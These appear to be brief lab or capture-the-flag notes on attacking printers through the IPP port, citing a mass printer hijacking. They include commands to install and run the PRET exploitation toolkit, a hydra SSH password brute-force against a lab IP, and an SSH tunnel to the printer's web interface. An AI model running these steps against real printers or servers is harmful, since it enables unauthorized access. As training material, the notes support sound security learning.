# Printer Hacking 101

Printer hacking and the basics of IPP.  

## IPP Port

Port 631  
Mass printer hacking has been taking advantage of over the past few years. One example would be when one attacker hacked around 50,000 printers, printing out messages asking people to subscribe to PewDiePie. In the next task we'll take a look at the reasons behind the success of this attack.  

### Open IPP port

"The Internet Printing Protocol (IPP)
specialized Internet protocol
communication between client devices and printers
clients submit print jobs to the printer or print server
clients query status of a printer, obtaining the status of print jobs, or cancel individual print jobs.

When an IPP port is open to the internet, anyone submits prin jobs or malicious data

## Targeting and Exploitation


[The Printer Exploitation Toolkit](https://github.com/RUB-NDS/PRET) is used for both local targeting and exploitation.

[PRET Cheat Sheet](https://hacking-printers.net/wiki/index.php?title=Printer_Security_Testing_Cheat_Sheet)

`:> git clone https://github.com/RUB-NDS/PRET`  
`:> python2 -m pip install colorama pysnmP`  
`:> python pret.py <IP>:<port> <protocol>`  

![access granted](/assets/printers-101.png)  

Brute force the ssh password.  

`:> hydra -l printer -P /usr/share/wordlists/rockyou.txt 10.65.177.18 ssh`  

`:> ssh printer@10.65.177.18 -T -L 3631:localhost:631`

Connect to device with the web browser  

![Connected](/assets/printers-102.png)  

